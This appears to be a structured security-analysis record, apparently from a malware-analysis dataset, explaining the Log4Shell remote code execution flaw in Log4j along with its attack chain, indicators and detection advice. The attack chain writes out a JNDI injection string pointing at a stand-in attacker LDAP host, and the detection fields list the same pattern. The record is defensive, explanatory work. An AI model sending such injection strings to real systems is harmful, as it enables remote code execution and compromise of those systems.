package_info.why_malicious: The affected versions of the Log4j library contain a critical remote code execution vulnerability (Log4Shell, CVE-2021-44228) that allows attackers to execute arbitrary code on systems that log attacker-controlled input. This is not a case of intentionally malicious code, but a severe vulnerability that enables malicious exploitation.

execution_context.file_location: Log4j core library (JndiLookup class, used internally by log4j)

malicious_snippets.code_behavior: At runtime, when a log statement containing a JNDI lookup pattern is processed, the Log4j library interprets the pattern, performs a JNDI lookup to the specified LDAP server, retrieves a remote Java class, and executes it, resulting in arbitrary code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input to trigger network requests and load/execute remote code, which is a classic remote code execution vector.
malice_analysis.violated_expectations: Normal logging libraries should not interpret log message content as executable code or perform network lookups based on log data. Here, user-controlled log messages can trigger code execution.
malice_analysis.similar_legitimate_use: JNDI lookups are sometimes used for dynamic configuration in trusted, internal environments, but should never be exposed to untrusted input.
key_indicators: Use of ${jndi:...} patterns in log messages
Automatic network requests triggered by log message content
Loading and executing remote code via JNDI/LDAP

attack_chain.action: Attacker sends a crafted string containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to an application endpoint that is logged.
attack_chain.leads_to: Log4j processes the log message and triggers a JNDI lookup.

attack_chain.action: Log4j performs a JNDI lookup to the attacker-controlled LDAP server.
attack_chain.leads_to: Remote Java class is loaded and executed on the victim system.

attack_chain.action: Attacker gains remote code execution on the victim system.
attack_chain.leads_to: Full system compromise or further post-exploitation actions.

behavioral_signatures: Log messages containing ${jndi:ldap://...} or similar patterns
Unexpected outbound LDAP, RMI, or other JNDI-related network requests from application servers
Loading of remote Java classes via JNDI lookups
file_indicators: Presence of vulnerable log4j-core JAR files (versions 2.0-beta9 through 2.14.1)
Application logs containing suspicious JNDI patterns
network_indicators: Outbound LDAP/RMI requests to untrusted or external servers
Connections to attacker-controlled infrastructure following log events
detection_knowledge.how_to_detect: Monitor application logs for suspicious JNDI patterns (e.g., ${jndi:ldap://}), scan for vulnerable log4j-core versions in dependencies, and monitor for unexpected outbound LDAP/RMI network traffic from application servers. Use security tools to flag or block log messages that could trigger JNDI lookups, and ensure all log4j dependencies are updated to patched versions.
